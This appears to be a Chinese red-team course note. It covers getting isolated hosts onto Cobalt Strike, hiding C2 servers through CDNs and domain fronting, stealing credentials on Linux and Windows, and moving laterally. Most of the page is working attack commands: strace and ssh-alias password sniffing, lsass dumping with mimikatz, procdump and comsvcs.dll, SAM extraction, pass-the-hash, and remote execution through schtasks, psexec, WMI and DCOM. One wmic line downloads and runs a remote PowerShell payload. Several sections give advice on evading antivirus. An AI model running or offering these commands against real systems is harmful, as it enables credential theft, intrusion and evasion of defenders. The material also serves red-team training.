<p>本种方式适用于目标机器和DMZ互通的情况下，具体思路如下：<br>跳板机开启http代理供目标机器使用，CobaltStrike新建一个监听器设置HTTP Proxy为跳板机代理地址，CobaltStrike生成stagerless木马上传到目标机器，如不可直接上传可使用跳板机搭配certutil.exe或者命令执行写webshell等方式进行中转上传，目标机器执行木马即可上线。</p>
<p><strong>上线不出网机器—正向木马上线CS</strong></p>
<p>此方法适用于DMZ能通内网但内网不通DMZ的状况即无法反弹会话的情况，遇到这种场景就要使用正向连接的木马来解决，在目标主机开启一个木马端口然后通过跳板机来连接。</p>
<p><strong>上线不出网机器—Pystinger上线CS</strong></p>
<p>毒刺（Pystinger）通过webshell搭建内网socks4代理，可用于上线CobaltStrike，此方法适用于目标主机不出网但存在web应用可被互联网访问的情况.服务端由webshell和stinger_server.exe构成，webshell只负责进行流量转发，大部分建立连接及处理数据的工作由stinger_server.exe实现，本质就是搭建了一个SOCK4代理转发流量。</p>
<p><strong>上线不出网机器—SMB Beacon上线CS</strong></p>
<p>SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB beacon相对隐蔽。SMB beacon不能直接生成可用载荷, 只能使用 PsExec 或 Stageless Payload 上线。<br>使用条件:<br>•具有 SMB Beacon 的主机必须接受 445 端口上的连接。<br>•只能链接由同一个 Cobalt Strike 实例管理的 Beacon。<br>•利用这种beacon横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。</p>
<h2 id="C-2-流量隐匿"><a href="#C-2-流量隐匿" class="headerlink" title="C 2 流量隐匿"></a>C 2 流量隐匿</h2><p><strong>c2服务器隐藏</strong></p>
<p>在红蓝对抗中，如果攻击者不通过手段隐藏C2服务器，这样可能导致C2被溯源以及被反撸。以下内容讲述如何通过手段隐蔽C2。</p>
<hr>
<p><strong>c2服务器隐藏—配置CDN</strong></p>
<p>给域名设置一个CDN，CS马上线使用域名上线，这样查自己的时候，查的是CDN地址，一定程度隐藏了C2的真实地址，CDN厂商那里把VPS地址绑定到域名上，保证可以和VPS通信。</p>
<hr>
<p><strong>c2服务器隐藏–域前置</strong></p>
<p>域前置技术就是通过CDN节点将流量转发到真实的C2服务器，其中CDN节点ip通过识别请求的Host头进行流量转发。这里作者利用阿里云全站加速CDN实现任意HOST头修改，利用构造高信誉域名，从而实现绕过流量分析。<br>•配置简单<br>•延展性强，可以随时更换IP，在红蓝对抗时可以快速部署，增加了防守封禁IP的难度。<br>•Host高信誉域名。<br>•注意阿里云不支持https的域前置<br>•缺点：对CDN资源较大，不建议长时间使用。</p>
<hr>
<p><strong>c2服务器隐藏–云函数</strong></p>
<p>这个技术最先是在今年的3月份国外提出的，他们利用 azure 对 C2 进行隐藏，国内也有相对应的 云函数厂商，于是我们就尝试使用云函数对我们的 C2 服务器进行隐藏。<br>优势：<br>云函数的好处就是配置简单，免费，高效，很适合日常渗透使用。</p>
<h2 id="横-向-中-的-凭-证-窃-取"><a href="#横-向-中-的-凭-证-窃-取" class="headerlink" title="横 向 中 的 凭 证 窃 取"></a>横 向 中 的 凭 证 窃 取</h2><p><strong>Linux凭证窃取–history记录敏感操作</strong></p>
<p>Linux系统会自动把用户的操作命令记录到历史列表中，当用户在命令行中输入账号、密码进行登录时，将会导致敏感信息泄露。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711160505846.png" alt="image-20220711160505846"></p>
<hr>
<p><strong>Linux凭证窃取–shadow文件破解</strong></p>
<p>shadow用于存储 Linux 系统中用户的密码信息，以一个用例来说明：<br>•root:$1$aXmGMjXX$MGrR.Hquwr7UVMwOGOzJV0::0:99999:7:::<br>密码域密文由三部分组成，即：$idsalt$encrypted。当id=1，采用md5进行加密，弱口令容易被破解.</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711160712725.png" alt="image-20220711160712725"></p>
<p>当id为5时，采用SHA256进行加密，id为6时，采用SHA512进行加密，可以通过john进行暴力破解。<br>•wget <a target="_blank" rel="noopener" href="https://www.openwall.com/john/k/john-1.9.0.tar.gz">https://www.openwall.com/john/k/john-1.9.0.tar.gz</a><br>•tar -zxvf john-1.9.0.tar.gz<br>•make clean linux-x86-64<br>•./john /etc/shadow</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711160740019.png" alt="image-20220711160740019"></p>
<hr>
<p><strong>Linux凭证窃取–mimipenguin抓取密码</strong></p>
<p>一款Linux下的密码抓取神器，需要root权限运行，通过转储进程并提取很可能包含明文密码的行来利用内存中的明文凭证，目前支持Kali、Ubnutu等操作系统。<br>•Github地址：<br>•<a target="_blank" rel="noopener" href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711160810672.png" alt="image-20220711160810672"></p>
<hr>
<p><strong>Linux凭证窃取–使用Strace收集登录凭证</strong></p>
<p>strace是一个动态跟踪工具，堪比键盘记录器的存在，可用来收集登录凭证。<br>获取sshd进程明文密码:<br>•(strace -f -F -p <code>ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;</code> -t -e trace=read,write -s 32 2&gt; /tmp/.sshd.log &amp;)<br>使用正在来匹配用户和密码：<br>•grep -E ‘read(6, “.+\0\0\0\.+”‘ /tmp/.sshd.log</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711160921929.png" alt="image-20220711160921929"></p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">收集ssh登陆凭证：</span><br><span class="line">•# 添加命令别名</span><br><span class="line">•vi ~/.bashrc或者/etc/bashrc</span><br><span class="line">•<span class="keyword">alias</span> ssh=<span class="string">&#x27;strace -f -e trace=read,write -o /tmp/.ssh-`date &#x27;</span>+%d%h%m%s<span class="string">&#x27;`.log -s 32 ssh&#x27;</span></span><br><span class="line">•# 使命令别名立即生效</span><br><span class="line">•<span class="keyword">source</span> ~/.bashrc</span><br><span class="line">通过grep 找到匹配行的后<span class="number">8</span>行，可以根据密码长度调整行数:</span><br><span class="line">•grep -A <span class="number">9</span> <span class="string">&#x27;password&#x27;</span> .ssh<span class="number">-25</span>Sep091601017212.<span class="keyword">log</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711161217645.png" alt="image-20220711161217645"></p>
<hr>
<p><strong>Linux凭证窃取–全盘搜索敏感信息</strong></p>
<p>全局搜索配置文件、脚本、数据库、日志文件是否有包含密码。<br>•grep -rn “password=” /<br>•swap_digger<br>•一个用于自动进行Linux交换分析bash脚本，自动进行交换提取，并搜索Linux用户凭据，Web表单凭据，Web表单电子邮件，HTTP基本身份验证，WiFi SSID和密钥等。</p>
<hr>
<p><strong>Windows凭证窃取—概述</strong></p>
<p>市面上可见到的读Windows本地密码的大多工具都是变则法子的去读lsass.exe的内存或者SAM数据库，然后从里面提取hash。所以有杀软的情况下读密码这事根本就不是工具免不免杀的问题，而是杀软有没有监控保护lsass.exe或SAM的问题，所以读本地密码条件可以总结为：能正常访问lsass.exe内存或SAM数据库。</p>
<hr>
<p><strong>Windows凭证窃取—lsass.exe</strong></p>
<p>在内网渗透进行横向移动和权限提升时，最常用的方法是通过 dump 进程 lsass.exe，从中获得明文口令或者 hash。<br>lsass.exe（Local Security Authority Subsystem Service）是一个系统进程，用于微软 Windows 系统的安全机制，它用于本地安全和登陆策略。在进程空间中，存有着机器的域、本地用户名和密码等重要信息。但是需要首先获得一个高的权限才能对其进行访问。</p>
<hr>
<p><strong>Windows凭证窃取–Mimikatz直接读取Lsass</strong></p>
<p>优点：<br>•方便快捷<br>缺点：<br>•mimikatz必须免杀<br>•无法绕过部分AV对lsass的监控<br>•sekurlsa::logonpasswords<br>其实是调用ReadProcessMemory来将lsass进程读入内存中的另一个地址中，然后对进程进行解析：<br>•mimikatz.exe log “privilege::debug” “sekurlsa::logonPasswords full” exit</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711161451356.png" alt="image-20220711161451356"></p>
<hr>
<p><strong>Windows凭证窃取—CS中的mimikatz</strong></p>
<p>当目标机器在CS上线时，如果是管理员权限或者是SYSTEM权限的话，可以直接使用<br>•mimikatz sekurlsa::privilege full<br>•mimikatz sekurlsa::logonpasswords full<br>CS采用的是反射dll模块内存加载,这个主要实现了cs里的一些功能比如mimikatz，screenshot，sshagent，hashdump等等这些功能全部是由反射dll实现的，Cobalt Strike作者将这些功能拆分成一个个的反射dll在使用时才加载执行。</p>
<hr>
<p><strong>Windows凭证窃取–签名/白名单文件Dump</strong></p>
<p>优点：<br>•程序拥有合法签名<br>•远程Dump后下载到本地离线解析，减少特征<br>缺点：<br>•虽然有签名但部分AV仍会发出警告<br>•无法绕过部分AV对lsass的监控<br>•dump得到的内存转储文件可能触发报警</p>
<p>主要有以下几个程序：<br>•Procdump.exe<br>•SqlDumper.exe<br>•AvDump.exe<br>•createdump.exe<br>•rundll32.exe<br>其中1、2、4这三个工具是有微软签名的，3是有杀软厂商Avast的签名，rundll32这个LOLBIN就不用说了前两个工具的用法已经是老生常谈了，网上也有很多文章，主要讨论后三个PS：注意使用这些工具的时候最好是system权限，如果是administrator的话要注意是否有SeDebugPrivilege，如果没有的话可以在命令前使用powershell -c</p>
<p>ProcDump<br>ProcDump是微软签名的合法二进制文件，被提供用于转储进程内存。可以在微软文档中下载官方给出的ProcDump文件:<br>•<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a><br>我们以管理员的方式运行:<br>•Procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br>得到转储文件lsass.dmp后我们将这个内存dump文件拷贝到mimikatz同目录下，双击打开mimikatz执行：<br>•mimikatz # sekurlsa::minidump lsass.dmp<br>•mimikatz # sekurlsa::logonPasswords full</p>
<p>执行如下命令<br>•Procdump.exe -accepteula -ma lsass.exe lsass.dmp<br>•在本机的上面跑 mimikazi 进行密码的成功查看<br>免杀效果<br>360杀，火绒新版不杀</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711161726679.png" alt="image-20220711161726679"></p>
<p>AvDump.exe<br>AvDump.exe是杀软Avast自带的一个程序，该程序可以用来dump进程的内存，拥有Avast的签名<br><code>•.\AvDump.exe --pid &lt;lsass pid&gt; --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\Users\admin\Desktop\lsass.dmp --min_interval 0</code><br>注意需要在ps中调用，否则cmd默认是不开启seDEBUGPrivilege权限的，但是现在360会检测到avdump</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711161811913.png" alt="image-20220711161811913"></p>
<p>SQLDumper.exe<br>SQLDumper.exe包含在Microsoft SQL和Office中，可生成完整转储文件。<br>•tasklist /svc | findstr lsass.exe 查看lsass.exe 的PID号<br>•Sqldumper.exe ProcessID 0 0x01100 导出mdmp文件<br>实战中下把生成的mdmp文件下载到本地，使用相同的操作系统打开。<br>•mimikatz.exe “sekurlsa::minidump SQLDmpr0001.mdmp”<br>“sekurlsa::logonPasswords full” exit<br>•mimikatz.exe “sekurlsa::minidump SQLDmpr0001.mdmp”<br>“sekurlsa::logonPasswords full” exit<br>文件是安全的，火绒和360都不会认为是可以或者是恶意程序，但是在转储该lsass.exe进程时会出现</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711161940902.png" alt="image-20220711161940902"></p>
<p>CreateDump.exe<br>createdump.exe随着.NET5出现的，本身是个native binary    虽然createdump.exe是随着.NET5出现的，但因为它是native binary，所以执行时并不需要依赖.NET5的环境<br><code>•createdump.exe -u -f lsass.dmp &lt;lsass pid&gt;</code></p>
<p>上述某些操作cmd执行不会自动提权，需要开启powershell或者powershell -c “ “去执行，或者psexec -s ，本质是需要se_debug权限在dump指定进程内存文件时，需要开启SeDebugPrivilege权限<br>•管理员权限的cmd下，默认支持SeDebugPrivilege权限，但是状态为Disabled<br>•管理员权限的powershell下，默认支持SeDebugPrivilege权限，并且状态为Enabled</p>
<hr>
<p><strong>Windows凭证窃取–利用SilentProcessExit进行Dump</strong></p>
<p>该技术和Werfault.exe进程有关，在某个运行中的进程崩溃时，werfault.exe将会Dump崩溃进程的内存，从这一点上看，我们是有可能可以利用该行为进行目标进程内存的Dump。在<a target="_blank" rel="noopener" href="https://www.mrwu.red/web/2000.html">https://www.mrwu.red/web/2000.html</a> 这篇文章中介绍了利用蓝屏崩溃来绕过卡巴斯基dump lsass进程,在win7之后，windows引入一些进程退出的相关机制称为“静默进程退出”的机制，该机制提供了在两种情况下可以触发对被监控进行进行特殊动作的能力：<br>•被监控进程调用 ExitProcess() 终止自身；<br>•其他进程调用 TerminateProcess() 结束被监控进程。</p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/lengjibo/RedTeamTools/tree/master/windows/LsassSilentProcessExit">https://github.com/lengjibo/RedTeamTools/tree/master/windows/LsassSilentProcessExit</a></p>
<p>优点：系统正常行为<br>缺点：需要写注册表<br>但在卡巴斯基环境下，不会报警但dump文件为0kb(猜测是卡巴拒绝系统行为转储lsass进程)而遇到defender+360的情况下，同样不会触发报警，但该程序无法修改注册表项</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711162209003.png" alt="image-20220711162209003"></p>
<hr>
<p><strong>Windows凭证窃取–使用系统内置功能(comsvcs.dll)</strong></p>
<p>每个Windows系统中都可以找到该文件，可以使用Rundll32执行其导出函数MiniDump实现进程的完全转储。该文件是一个白名单文件，我们主要是利用了Comsvsc.dll中的导出函数APIMiniDump来实现转储lsass.exe的目的，注意同样是需要管理员权限:该文件位于C:\windows\system32\comsvcs.dll    我们使用如下方式来调用MiniDump实现转储lsass.exe进程:<br>•rundll32 C:\windows\system32\comsvcs.dll MiniDump “&lt;lsass.exe pid&gt; dump.bin full”</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711162308348.png" alt="image-20220711162308348"></p>
<hr>
<p><strong>Windows凭证窃取–SSP</strong></p>
<p>安全支持提供程序（SSP）是一个dll文件，用于扩展Windows身份验证机制。我们熟悉的lsass进程在启动时会加载安全支持提供程序SSP。当我们替换某个ssp为恶意ssp，或者将ssp文件上传，修改lsa注册表使之启动时加载，然后我们就可以<br>利用恶意dll将输入lsass程序的明文密码保存下来，实现抓明文密码。此方法适用于win8/win2012后无法获取明文密码，或者维持域控、在域控上抓用户密码(前提是有管理员权限）</p>
<p>优点：<br>•可以绕过部分杀软对lsass的监控<br>•可以加载mimilib来记录密码以应对版本大于等于Windows Server 2012的情况<br>•不需要重启服务器<br>缺点：<br>•需要写注册表<br>•需要将SSP的dll拷贝到system32下（这个说缺点似乎也谈不上）<br>•Blue Team可以通过枚举SSP来发现我们自定义的SSP，并且lsass进程中可以看到加载的DLL</p>
<hr>
<p><strong>Windows凭证窃取–签名/白名单文件Dump</strong></p>
<p>优点：<br>不需要重启服务器<br>Lsass进程中不会出现可疑的DLL<br>缺点：<br>需要调用WriteProcessMemory对lsass进行操作，可能会被标记</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711162538115.png" alt="image-20220711162538115"></p>
<hr>
<p><strong>Windows凭证窃取—Windows SAM</strong></p>
<p>在win中，NTLM hash通常储存在SAM文件中<br>•物理路径：C:\windows\system32\config\SAM<br>SAM是windows系统的一个系统用户账号管理文件。win中对用户账户的安全管理使用了安全账号管理器SAM的机制,安全账号管理器对账号的管理是通过安全标识进行的，安全标识在账号创建时就同时创建，一旦账号被删除，安全标识也同时被删除。一旦某个账号被删除，它的安全标识就不再存在了，即使用相同的用户名重建账号，也会被赋予不同的安全标识，不会保留原来的权限。SAM 文件一旦丢失，会失去所有用户账号。</p>
<hr>
<p><strong>Windows凭证窃取—SAM抓取</strong></p>
<p>Imapcket-secretdump<br>•reg save hklm\sam sam.hive<br>•reg save hklm\system system.hive<br>•reg save hklm\security security.hive<br>•python3 secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711162707310.png" alt="image-20220711162707310"></p>
<p>mimikatz在线读取SAM数据库<br>•privilege::debug<br>•token::elevate<br>•lsadump::sam</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711162755691.png" alt="image-20220711162755691"></p>
<p>利用empire里面的一个powershell脚本，下载地址：<br>•<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711162849579.png" alt="image-20220711162849579"></p>
<p>从左到右依次是用户名，Rid，ntlm，lm。<br>Rid为500代表是管理员，504代表是guest账号等。lm跟ntlm的区别是加密方法的不同</p>
<hr>
<p><strong>Windows凭证窃取– SAM 解密</strong></p>
<p>要解密 hash，我们需要获取到 SAM SYSTEM SECURITY 这三个⽂件。只要有这3个文件我们就能进行读取。<br>REG SAVE 将指定的子项、项和注册表值的副本保存到指定文件中，直接保存就可以了<br>•reg save hklm\system SYSTEM<br>•reg save hklm\sam SAM<br>•reg save hklm\security SECURITY</p>
<p>解密恢复 HASH<br>通过上面几种方法拿到 3 个文件后，我们用 impacket-secretsdump 来进行解密。<br>•impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL<br>用得到的 HASH 直接去解密即可。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711162947047.png" alt="image-20220711162947047"></p>
<hr>
<p><strong>Windows凭证窃取–KB2871997</strong></p>
<p>如果系统安装KB2871997补丁或者系统版本大于等于window server 2012时(服务器版本),大于等于win8.1(家庭版本)时（自带补丁），默认在lsass.exe这个进程中不会再将可逆的密文缓存在自己的进程内存中，所以我们默认是没办法通过读取这个进程然后逆向该密文来获取明文密码。<br>•<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed">https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed</a></p>
<hr>
<p><strong>Windows凭证窃取—总结</strong></p>
<p>•无杀软随便玩，直接mimikatz上去读就是<br>•无监控lsass的AV/EDR，可以通过免杀mimikatz进行直接读取，也可以使用白名单程序进行dump（需要注意部分杀软会对白名单程序报警）<br>•如果是卡巴这种监控lsass的，最好是使用加载SSP的方式，优缺点参考前面的，可以根据不同情况使用不同的方法</p>
<h2 id="横-向-中-的-命-令-执-行"><a href="#横-向-中-的-命-令-执-行" class="headerlink" title="横 向 中 的 命 令 执 行"></a>横 向 中 的 命 令 执 行</h2><p><strong>内网横向—Pass-the-hash</strong></p>
<p>不论是网站还是windows系统，都不会去明文存储用户的密码，是最基本的一条安全准则。那么进行相关登录验证的时候，就会获取用户输入的明文密码然后经过加密处理后再和数据库中的散列值进行对比，从而进行相关校验所谓PTH即Pass the Hash缩写，字面理解密码就是hash的意思。我们一般拿到windows的ntlmhash后会进行相关破解，如果密码复杂度高可能一般破解不容易，那么我们可以直接拿hash去进行相关服务的访问，拿hash当作密码给服务器校验。总结一句话：用户使用哈希而不需要原始密码就能进行身份验证</p>
<p>pth批量横向移动<br>CME集成了wmiexec、atexe、smbexec的方式,集成了smb扫描,口令爆破等功能,非常适合拿来快速移动。支持批量传递hash的功能<br>•cme smb 10.73.147.90 10.73.147.88 -u administrator -H 852a844adfce18f66009b4f14e0a98de</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711163214255.png" alt="image-20220711163214255"></p>
<p>Cobalt Strike 的pth</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711163245133.png" alt="image-20220711163245133"></p>
<hr>
<p><strong>内网横向—IPC$ &amp;&amp; 计划任务</strong></p>
<p>计划任务，需要Administrators才能执行，之前我也说过用它提权方法，因为它的默认权限是system，不过到了2008之后便不能交互式了，比如下面这样。<br>•没有禁用IPC$连接、139和445端口、未使用防火墙等方式来阻止IPC$。<br>•目标机器开启了相关的IPC$服务。<br>•需要目标机器的管理员账号和密码（IPC$空连接除外）。<br>•需要得知目标机器IP地址并可互相通信。<br>ipc远程命令执行<br>•net use \1.1.1.1\ipc$ “password” /user:username<br>Schtasks远程命令执行<br>•schtasks /create /s 1.1.1.1 /u domain\Administrator /p password /ru “SYSTEM” /tn “windowsupdate” /sc DAILY /tr “calc” /F<br>•schtasks /run /s 1.1.1.1 /u domain\Administrator /p password /tn windowsupdate</p>
<hr>
<p><strong>内网横向—PsExec</strong></p>
<p>psexec 是 windows 下非常好的一款远程命令行工具。psexec的使用不需要对方主机开方3389端口，只需要对方开启admin$共享 (该共享默认开启)。但是，假如目标主机开启了防火墙，psexec也是不能使用的，会提示找不到网络路径。<br>psexec的基本原理：<br>•通过ipc$连接admin$，释放二进制文件psexecsvc.exe到目标<br>•通过服务管理SCManager远程创建一个psexec服务，并启动服务<br>•客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据<br>•运行结束后删除服务<br>用服务启动的方式：<br>•psexec \target -accepteula -u username -p password cmd.exe<br>•psexec.py jumbolab.com/<a href="mailto:&#x61;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x40;&#x31;&#x37;&#x32;&#46;&#x31;&#54;&#46;&#x31;&#50;&#55;&#x2e;&#49;&#56;&#x34;">&#x61;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x40;&#x31;&#x37;&#x32;&#46;&#x31;&#54;&#46;&#x31;&#50;&#55;&#x2e;&#49;&#56;&#x34;</a></p>
<hr>
<p><strong>内网横向—WMI</strong></p>
<p>WMI全称“windows管理规范”，从win2003开始一直存在。<br>利用条件<br>•WMI服务开启，端口135，默认开启。<br>•防火墙允许135、445等端口通信。<br>•管理员权限，以及本地管理员组…<br>关于域用户添加进本地管理组的方法，可以参考(<a target="_blank" rel="noopener" href="https://richardstk.com/2013/11/26/adding-domain-users-to-the-local-administrators-group-using-group-policy/">https://richardstk.com/2013/11/26/adding-domain-users-to-the-local-administrators-group-using-group-policy/</a>)<br>windows自带wmic工具横向移动<br>•wmic /NODE:192.168.93.20 /user:”TEST\administrator” /password:”zxcASDqwe123” PROCESS call create “powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.0.108:8080/a&#39;))\&quot;&quot;">http://192.168.0.108:8080/a&#39;))\&quot;&quot;</a></p>
<p>wmiexec.vbs<br>域环境下还是在工作组环境下都可正常使用。使用域账号或本地账号均可<br>工作组：<br>•cscript wmiexec.vbs /shell 192.168.x.x administrator Aatest<br>域环境：<br>•cscript wmiexec.vbs /shell 192.168.93.20 TEST\administrator zxcASDqwe123<br>为了解决wmic无法回显命令而开发的一个工具，原理就是把数据先存到一个临时文件中，在每次读取完执行结果后就自动删除。可以用来回显 “执行命令的结果”和获取 “半交互式的shell”。</p>
<p>Invoke-TheHash.ps1<br>分别导入Invoke-WMIExec.ps1和Invoke-TheHash.ps1，然后批量撞网段内的机器即可.<br>•Invoke-TheHash -Type WMIExec -Target 192.168.93.0/24 -Domain TEST -Username administrator -Hash aad3b435b51404eeaad3b435b51404ee<br>impacket套件<br>域用户<br>•优点：支持pth<br>•缺点：他的使用需要调用wmi服务，占用目标的445、135和另一个随机端口。<br>•python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c 域<br>名/<a href="mailto:&#97;&#100;&#109;&#105;&#110;&#x69;&#x73;&#x74;&#x72;&#x61;&#116;&#111;&#114;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#x78;&#x78;&#x2e;&#120;&#120;&#120;">&#97;&#100;&#109;&#105;&#110;&#x69;&#x73;&#x74;&#x72;&#x61;&#116;&#111;&#114;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#x78;&#x78;&#x2e;&#120;&#120;&#120;</a> “ipconfig”</p>
<p>WMIHACKER(推荐)<br>免杀横向渗透远程命令执行，常见的WMIEXEC、PSEXEC执行命令是创建服务或调用Win32_Process.create执行命令，这些方式都已经被杀软100%拦截，通过改造出WMIHACKER免杀横向移动测试工具。(只依赖135端口，不依赖139和445端口)<br>重要：支持pth -&gt; <a target="_blank" rel="noopener" href="https://github.com/360-Linton-Lab/WMIHACKER/issues/1">https://github.com/360-Linton-Lab/WMIHACKER/issues/1</a><br>主要功能：1、命令执行；2、文件上传；3、文件下载<br>•<a target="_blank" rel="noopener" href="https://github.com/360-Linton-Lab/WMIHACKER">https://github.com/360-Linton-Lab/WMIHACKER</a><br>•<a target="_blank" rel="noopener" href="https://github.com/checkymander/Sharp-WMIExec">https://github.com/checkymander/Sharp-WMIExec</a><br>•<a target="_blank" rel="noopener" href="https://github.com/nccgroup/WMIcmd">https://github.com/nccgroup/WMIcmd</a><br>调用Win32_ScheduledJob取代Win32_Process2</p>
<p>wmi bypasss<br>•可能拦截了WMI process creation through win32_process，可以试试其他的方式<br>•<a target="_blank" rel="noopener" href="https://github.com/rootclay/WMIHACKER">https://github.com/rootclay/WMIHACKER</a><br>•调用任务计划<br>•<a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpWMI">https://github.com/GhostPack/SharpWMI</a><br>•remote execution of arbitrary VBS through WMI event<br>调用Win32_ScheduledJob取代Win32_Process2</p>
<hr>
<p><strong>内网横向—DCOM</strong></p>
<p>DCOM（分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是Internet上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。DCOM是COM（组件对象模型）的扩展，它允许应用程序实例化和访问远程计算机上COM对象的属性和方法。DCOM 使用远程过程调用（RPC）技术将组件对象模型（COM）的功能扩展到本地计算机之外，因此，在远程系统上托管COM服务器端的软件（通常在DLL或exe中）可以通过RPC向客户端公开其方法。</p>
<p>COM 是 Windows 的一个组件，可促进软件之间的互操作性，DCOM 使用远程过程调用 (RPC)将其扩展到整个网络。<br>分布式组件对象模型(DCOM)远程协议是一种通过远程调用(RPC)公开应用程序对象的协议在windows注册表包含3个标识符中的DCOM配置数据：<br>•CLSID：类标识符是全局唯一标识符。在windows在程序中为每个以及安装的类储存一个CLSID。当我们需要运行一个类的时候，只需要知道正确的CLSID即可<br>•PROGID：程序标识符，这个是程序员用来替代更为复杂的GLSID，同意理解。<br>•APPID：应用程序标识符，为了简化通用安全和配置设置的管理，由同一可执行文件托管的分布式 COM 对象被分组到一个 AppID 中，属于同一可执行文件的所有类以及访问它所需的权限。如果 APPID 不正确，DCOM 将无法工作。</p>
<p>一个DCOM运行流程<br>•客户端请求远程计算机通过CLSID或者PROGID创建一个对象。如果通过了APPID，远程计算机将会使用PROGID查找CLSID。<br>•远程计算机检查APPID并且验证客户端是否具有创建对象权限。<br>•如果是exe则通过DCOMLaunch.exe如果是dll则通过DLLHOST.exe创建客户端计算机请求的类实例。<br>•如果沟通成功，则客户端可以访问远程计算机上类的所有函数。<br>攻击者可使用 DCOM 进行横向移动，通过 DCOM，攻击者可在拥有适当权限的情况下通过Office 应用程序以及包含不安全方法的其他 Windows 对象远程执行命令</p>
<p>利用DCOM进行横向移动有两个条件：<br>•能关闭靶机防火墙<br>•拥有cmdshell、靶机需要使用administrator账户<br>DCOM进行横向移动的操作如下：<br>•与靶机建立ipc连接<br>•cs生成木马使用copy命令上传到靶机<br>•调用DCOM远程执行命令</p>
<p>通过PowerShell与DCOM进行远程交互，此外，我们只需要提供一个DCOM ProgID和一个IP地址，然后，它就从远程返回一个COM对象的实例。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">•<span class="variable">$com</span> =[activator]::CreateInstance([type]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;192.168.52.138))</span></span><br><span class="line"><span class="string">•<span class="subst">$com</span>.Document.ActiveView.ExecuteShellCommand(&#x27;cmd.exe&#x27;,<span class="subst">$null</span>,&quot;</span>/c c:\shell.exe<span class="string">&quot;,&quot;</span>Minimized<span class="string">&quot;)</span></span><br></pre></td></tr></table></figure>

<p>执行以上命令我们就可以调用ExecuteShellCommand方法在远程主机上启动进程</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711165329047.png" alt="image-20220711165329047"></p>
<p>通过调用9BA05972-F6A8-11CF-A442-00A0C90A8F39来执行exe文件</p>
